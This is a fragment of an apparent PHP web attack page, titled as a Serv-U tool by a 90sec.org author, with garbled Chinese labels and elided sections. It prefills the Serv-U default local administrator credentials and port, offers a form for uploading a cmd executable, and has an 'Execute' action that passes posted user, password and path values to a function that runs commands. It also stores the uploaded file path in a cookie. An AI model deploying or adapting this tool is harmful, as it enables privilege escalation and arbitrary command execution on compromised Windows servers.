...
<html>
<head>
<title>Serv-UȨ by cfking@90sec.org</title>
...
<td width="46"><input type="submit" name="read" value="ȡ"></td>
</tr>
</table>
</form>
</center>
...
<td colspan='2' id=s><font face=webdings>8</font> <B>һFTPû</b></td></tr>
<tr align='center' valign='middle'><td width='100' id=d>û</td><td width='379' id=d><input name='suser' type='text' id='u' value='LocalAdministrator'></td></tr>
<tr align='center' valign='middle'><td id=d> &nbsp;룺</td><td id=d><input name='spass' type='text' id='p' value='#l@$ak#.lk;0@P'></td></tr>
<tr align='center' valign='middle'><td id=d>ˡڣ</td><td id=d><input name='sport' type='text' id='port' value='43958'></td></tr>
...
<tr align='center' valign='middle'><td id=d>· &nbsp;</td><td id=d><input name='dir' type='text' id='p' value='<?php echo dirname(__FILE__);?>\' size='55'></td></tr>
...
<td width="46"><input type="submit" name="subfile" value="ϴCMD"></td>
</tr>
</table>
</form>
</center>
...
<center><table width='500' height='163'>
<tr align='center' valign='middle'>
<td colspan='2' id=s><font face=webdings>8</font> <B>ڶִ</b></td></tr>
...
echo '<center><p></p><p></p><p></p><B>ԣ</b><b>ڶִ<a href="?act=do"><font color="red">Go Execute</font></a></b><br /><textarea  cols="80" rows="15" readonly>'."\r\n";
up($_POST['port'],$_POST['user'],$_POST['pass'],$dir,$_POST['suser'],$_POST['spass'],$_POST['sport']);
echo '</textarea><br/><b>ڶִ<a href="?act=do"><font color="red">Go Execute</font></a></b></center>';
}

if($act=='Execute'){
$path=str_replace('\\','/',$_POST['path']);
echo '<center><p></p><p></p><p></p><B>ԣ</b><br /><textarea  cols="80" rows="15" readonly>'."\r\n";
...
echo '<center><font color="red">ϴʧ</font></center>';
}else{

setcookie('cmdpath',$upfile);
echo '<center><font color="red">ϴɹ,·Ϊ'.$upfile.'</font></center><br/><br/><br/><br/>';
	  }
